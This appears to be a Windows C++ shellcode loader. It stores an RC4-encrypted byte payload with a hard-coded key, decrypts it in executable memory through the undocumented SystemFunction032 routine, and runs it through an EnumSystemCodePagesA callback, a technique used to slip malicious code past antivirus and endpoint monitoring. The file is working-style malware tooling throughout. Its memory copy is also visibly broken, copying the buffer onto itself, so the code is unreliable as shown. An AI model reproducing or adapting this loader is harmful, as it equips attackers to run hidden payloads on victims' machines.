#include <Windows.h>
#include <iostream>

#include "typedefs.h"

unsigned char buf[] = "\x04\x5b\x74\x8d\x09\xb7\x67\x2d\xb0\x15\x74\xdb\xa7\xbc\x64\x65\x6c\xa8\x3f\xfe\x87\x18\x17\xa0\xbf\x0f\xbd\xa3\x65\x9a\x8e\x0d\xb5\x53\x9d\x27\xd4\x08\xdb\xc8\xc0\xd5\x4a\xb8\x51\x9e\x42\x39\x36\x5b\x18\xea\xb5\x22\xb8\x1c\x6e\x41\x17\xf0\x01\x01\x7b\xa8\x71\xdf\xd1\xa7\x99\x0d\xd6\xe8\x2e\xd0\x7f\xc0\xa8\xf4\x09\xc7\x98\xa2\x57\xe0\xe2\xa3\x40\x74\xbe\x7a\x6f\x79\x57\x17\xcc\xbd\x44\xf3\x52\x5d\x72\xfc\x5e\xc7\x88\xbc\xba\xce\x88\x42\x32\xc8\x7a\xb0\x67\x95\xe2\xa4\x55\x20\x77\xa5\xa0\x95\x2f\x43\xa2\xd8\x72\x44\xa8\xef\x13\x38\x67\x21\xd5\x24\xac\x3a\x06\xbd\x28\xf8\x5f\xad\x12\x0e\x84\x89\x52\x8b\xc9\x50\x80\xba\x1a\x90\x48\x0b\x1a\xa0\x2a\xb0\x3d\x07\xe2\x4e\x9f\x9a\x66\x23\x7e\xa1\xec\xd1\x10\x40\xb2\x5b\x9d\x24\xac\x78\xe3\x45\xf8\xf8\xce\xf6\x89\x2f\x99\xf4\xb8\x9c\xcd\xff\x3a\xae\xf9\x42\x11\xe8\xaf\x19\xba\xb0\xd3\xe3\xb7\x8c\xbb\x3f\x72\x38\x92\x9c\xc0\xe1\x06\xca\x15\xfa\x0c\x52\x5b\x6b\x79\xef\x4a\x7a\xf3\x26\x1d\xdd\x3b\x07\xbe\xb9\xec\xcd\x52\x6f\x61\x19\x67\xaf\x2e\x14\xaf\x45\x14\xf0\xbd\x3f\x84\x90\x68\x15\x3e\x92\xa5\x13\x47\x77\xe8\xaf\x8a\x72\x03\x42\x68\x0c\x30\x6c\xbf\xc0\x6a\xbf\x19\x44\xfe\xcc\x1e\xe3\x69\x4e\x30\x04\x6a\x3c\x8b\xf0\x27\x4a\xb6\x27\xcc\x2a\x43\xcc\x14\x5e\x1a\xc3\x19\x13\x18\x42\x51\xa2\x02\x08\x61\xb3\x9f\x31\xfd\xad\xd4\x6a\x26\x71\x72\x16\x6f\x7d\x52\x73\x01\xd0\xd1\x1b\xba\x95\xcc\x7f\x28\x86\x07\xe5\x9c\xbb\x1b\x7a\xa5\xa2\xa2\x76\x35\x91\x27\x71\xe9\x4a\x2e\xe2\xb3\x19\x2f\x53\xcc\x15\x01\x8c\xd7\x15\xe1\x11\xab\x09\x33\xff\xc5\x57\x6a\x4b\xf3\x71\x64\x31\x0b\x2a\x83\x2c\xf1\xd2\x38\x2b\x77\x3c\xa8\x28\x64\xc6\xd4\x64\xab\x88\xde\x03\x67\xbb\x64\xab\x00\x87\x6f\xa8\x85\xc7\x5c\xb0\x7e\x04\x40\x3e\x48\x3e\xa6\x06\x49\x1f\xcf\xb3\x82\x23\xcf\x0d\x3f\x86\x1d\x57";
const char key[] = "secretPassw0rd!_";

int main() {

	char func32[] = "SystemFunction032";
	HMODULE hAdvapi = LoadLibraryA("advapi32.dll");

	SystemFunction032 _SystemFunction032 = (SystemFunction032)GetProcAddress(hAdvapi, func32);
	if (_SystemFunction032)
		printf("++ Found %s ( 0x%p )\n", func32, _SystemFunction032);

	ustring _data;
	ustring _key;
	
	_data.Length = sizeof buf;

	_key.Buffer = (PUCHAR)&key;
	_key.Length = sizeof key;

	void* ptr = VirtualAlloc(NULL, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	_data.Buffer = (PUCHAR)ptr;
	
	//printf("%p", ptr);

	memcpy(ptr, _data.Buffer, _data.Length);
	
	_SystemFunction032(&_data, &_key); //decrypt memory

	FreeLibrary(hAdvapi);

	EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)ptr, 0);
}